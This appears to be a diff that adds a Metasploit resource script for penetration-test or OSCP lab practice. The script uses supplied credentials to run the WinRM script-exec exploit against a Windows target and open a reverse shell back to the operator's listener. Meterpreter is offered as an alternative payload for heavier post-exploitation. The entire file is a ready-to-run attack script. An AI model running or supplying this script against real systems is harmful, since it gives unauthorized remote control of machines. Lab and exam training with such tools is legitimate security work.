@@ -1,0 +1,56 @@
+##
+# WinRM reverse shell via winrm_script_exec
+#
+# Intended usage:
+#
+#   # 1) You already have valid creds:
+#   setg RHOSTS <target_ip>      # or set RHOSTS in-module
+#   setg USERNAME <user>
+#   setg PASSWORD <pass>
+#   setg LHOST <your_ip>         # if not already set globally
+#   setg LPORT 4444              # optional, or set in-module
+#
+#   # 2) Then:
+#   resource protocols/winrm/winrm_access/winrm_shell.rc
+#
+# Notes:
+#   - Default payload is a simple x64 reverse shell (OSCP-safe).
+#   - Swap to meterpreter if you want in labs.
+##
+
+spool logs/winrm_shell.log
+
+workspace
+echo [*] Target (RHOSTS): ${RHOSTS}
+echo [*] USERNAME:        ${USERNAME}
+echo [*] LHOST (global):  ${LHOST}
+echo [*] LPORT (global):  ${LPORT}
+
+use exploit/windows/winrm/winrm_script_exec
+
+# Pull from globals you set
+set RHOSTS   ${RHOSTS}
+set USERNAME ${USERNAME}
+set PASSWORD ${PASSWORD}
+
+# Payload: simple shell by default (exam-friendly)
+set PAYLOAD windows/x64/shell/reverse_tcp
+# For labs / heavier post-ex:
+# set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Use whatever LHOST/LPORT you already set globally.
+# You can override inside the module too:
+# set LHOST <your_ip>
+# set LPORT 4444
+
+# More reliable on some setups
+set FORCE_VBS true
+
+show options
+
+exploit -j
+
+sessions -l
+
+spool off
+
